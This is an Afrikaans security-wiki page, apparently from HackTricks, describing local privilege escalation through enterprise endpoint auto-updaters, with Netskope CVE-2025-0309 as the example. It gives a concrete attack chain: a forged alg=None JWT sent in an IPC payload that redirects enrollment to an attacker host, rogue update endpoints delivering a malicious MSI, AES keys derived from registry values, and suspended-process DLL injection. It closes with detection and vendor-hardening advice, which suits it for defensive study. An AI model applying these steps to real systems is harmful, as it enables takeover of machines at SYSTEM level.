# Misbruik van Enterprise Auto-Updaters en Geprivilegieerde IPC (bv., Netskope stAgentSvc)

{{#include ../../banners/hacktricks-training.md}}

Hierdie bladsy veralgemeen ’n klas Windows lokale privilege‑escalation kettings wat gevind word in enterprise endpoint agents en updaters wat ’n laag‑friksie IPC‑oppervlak en ’n geprivilegieerde update‑vloei blootstel. ’n Reprensentatiewe voorbeeld is Netskope Client for Windows < R129 (CVE-2025-0309), waar ’n laag‑geprivilegieerde gebruiker inskrywing na ’n aanvaller‑beheer­de bediener kan afdwing en daarna ’n kwaadaardige MSI kan lewer wat die SYSTEM‑diens installeer.

Belangrike idees wat jy teen soortgelyke produkte kan hergebruik:
- Misbruik ’n geprivilegieerde diens se localhost IPC om her‑inskrywing of herkonfigurering na ’n aanvaller‑bediener af te dwing.
- Implementeer die vendor se update‑endpoints, lewer ’n rogue Trusted Root CA, en punt die updater na ’n kwaadwillige, “signed” pakket.
- Ontduik swak signer checks (CN allow‑lists), opsionele digest‑vlae, en laks MSI‑eienskappe.
- As IPC “encrypted” is, lei die key/IV af vanaf wêreld‑leesbare masjien‑identifiseerders wat in die registry gestoor is.
- As die diens oproepers beperk volgens image path/process name, inject in ’n allow‑listed proses of spawn een geskors en bootstrap jou DLL via ’n minimale thread‑context patch.

---
## 1) Forceer inskrywing na ’n aanvaller‑bediener via localhost IPC

Baie agents lewer ’n user‑mode UI‑proses wat met ’n SYSTEM‑diens oor localhost TCP kommunikeer met JSON.

Waargeneem in Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Uitbuitingsvloei:
1) Skryf ’n JWT enrollment token waarvan die claims die backend‑host beheer (bv., AddonUrl). Gebruik alg=None sodat geen signature vereis word nie.
2) Stuur die IPC‑boodskap wat die provisioning‑opdrag aanroep met jou JWT en tenant‑naam:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Die diens begin jou rogue server vir enrollment/config te kontak, bv.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Aantekeninge:
- If caller verification is path/name‑based, originate the request from a allow‑listed vendor binary (see §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Sodra die client met jou bediener kommunikeer, implementeer die verwagte endpoints en lei dit na 'n attacker MSI. Tipiese volgorde:

1) /v2/config/org/clientconfig → Gee JSON-config terug met 'n baie kort updater-interval, bv.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Gee 'n PEM CA sertifikaat terug. Die diens installeer dit in die Local Machine Trusted Root store.  
3) /v2/checkupdate → Verskaf metadata wat na 'n kwaadwillige MSI en 'n valse weergawe wys.

Bypass van algemene kontroles wat in die veld aangetref word:
- Signer CN allow‑list: die diens mag slegs die Subject CN nagaan of dit gelyk is aan “netSkope Inc” of “Netskope, Inc.”. Jou eensindige CA kan 'n leaf-sertifikaat met daardie CN uitreik en die MSI teken.
- CERT_DIGEST-eienskap: sluit 'n onskadelike MSI-eienskap met die naam CERT_DIGEST in. Geen afdwinging tydens installasie nie.
- Opsionele digest-afdwinging: config-vlag (bv., check_msi_digest=false) skakel ekstra kryptografiese validering af.

Resultaat: die SYSTEM-diens installeer jou MSI vanaf
C:\ProgramData\Netskope\stAgent\data\*.msi
en voer ewekansige kode uit as NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

Vanaf R127 het Netskope IPC JSON in 'n encryptData-veld toegedraai wat soos Base64 lyk. Reversing het gewys op AES met key/IV afgelei van registerwaardes wat deur enige gebruiker gelees kan word:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Aanvallers kan die enkripsie reproduseer en geldige, geënkripteerde opdragte vanaf 'n standaardgebruiker stuur. Algemene wenk: as 'n agent skielik sy IPC "enkripteer", kyk vir device IDs, product GUIDs, install IDs onder HKLM as materiaal.

---
## 4) Bypassing IPC caller allow‑lists (path/name checks)

Sommige dienste probeer die peer autentiseer deur die TCP-verbinding se PID op te los en die image path/name te vergelyk met 'n allow‑list van vendor-binaries onder Program Files (bv. stagentui.exe, bwansvc.exe, epdlp.exe).

Twee praktiese omseilings:
- DLL-injektie in 'n toegelate proses (bv. nsdiag.exe) en proxy IPC van binne dit.
- Spawn 'n toegelate binêre gesuspendeer en bootstrap jou proxy DLL sonder CreateRemoteThread (sien §5) om bestuurder-afgedwingde manipulasie-reëls te bevredig.

---
## 5) Tamper‑protection friendly injection: suspended process + NtContinue patch

Produkte bevat dikwels 'n minifilter/OB callbacks driver (bv. Stadrv) wat gevaarlike regte van handvatsels na beskermde prosesse verwyder:
- Process: verwyder PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: beperk tot THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

'n Betroubare user‑mode loader wat hierdie beperkings respekteer:
1) CreateProcess van 'n vendor-binary met CREATE_SUSPENDED.
2) Verkry handvatsels wat jy nog toegelaat is: PROCESS_VM_WRITE | PROCESS_VM_OPERATION op die proses, en 'n thread-handle met THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (of net THREAD_RESUME as jy kode by 'n bekende RIP patch).
3) Oorskryf ntdll!NtContinue (of 'n ander vroeë, gewaarborgde-gelaaide thunk) met 'n klein stub wat LoadLibraryW op jou DLL-pad aanroep, en dan terug spring.
4) ResumeThread om jou stub in‑proses te trigger en jou DLL te laai.

Omdat jy nooit PROCESS_CREATE_THREAD of PROCESS_SUSPEND_RESUME op 'n reeds-beskermde proses gebruik het nie (jy het dit geskep), word die bestuurder se beleid bevredig.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) outomatiseer 'n rogue CA, kwaadwillige MSI-ondertekening, en bedien die nodige endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope is 'n custom IPC client wat arbitraire (opsioneel AES‑geënkripteerde) IPC-boodskappe skep en die gesuspendeerde‑proses injeksie insluit om van 'n allow‑listed binary te originate.

---
## 7) Detection opportunities (blue team)
- Monitor toevoegings aan Local Machine Trusted Root. Sysmon + registry‑mod eventing (sien SpecterOps guidance) werk goed.
- Merk MSI-uitvoerings wat deur die agent se diens geïnisieer word vanaf paaie soos C:\ProgramData\<vendor>\<agent>\data\*.msi.
- Hersien agentlogs vir onverwante enrollment hosts/tenants, bv.: C:\ProgramData\netskope\stagent\logs\nsdebuglog.log – kyk vir addonUrl / tenant anomalieë en provisioning msg 148.
- Waarschuw vir localhost IPC-kliente wat nie die verwagte signed binaries is nie, of wat uit vreemde child process-boom gewortel is.

---
## Hardening tips for vendors
- Bind enrollment/update hosts aan 'n streng allow‑list; verwerp onbetroubare domeine in clientkode.
- Authenticate IPC peers met OS-primitive (ALPC security, named‑pipe SIDs) in plaas van image path/name kontroles.
- Hou geheime materiaal uit wêreld-leesbare HKLM; as IPC geënkripteer moet wees, lei sleutels af van beskermde geheime of onderhandel oor geauthentiseerde kanale.
- Behandel die updater as 'n supply‑chain surface: vereis 'n volle ketting na 'n vertroude CA wat jy beheer, verifieer pakkethandtekenings teen gepinde sleutels, en fail closed as validering in die config gedeaktiveer is.

## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)

{{#include ../../banners/hacktricks-training.md}}
